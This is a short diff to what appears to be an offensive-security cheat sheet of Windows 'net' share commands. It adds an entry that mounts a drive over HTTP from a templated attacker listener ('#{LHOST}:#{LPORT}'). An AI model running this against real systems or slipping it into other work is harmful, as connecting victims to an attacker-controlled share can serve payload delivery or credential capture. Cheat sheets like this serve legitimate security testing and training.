@@ -28,6 +28,9 @@ net view \\computer /ALL
 # desc: Mount the share locally
 net use x: \\computer\share 
 
+# desc: Mount the share with http
+net use x: http://#{LHOST}:#{LPORT}
+
 # desc: Check current shares
 net share 
 
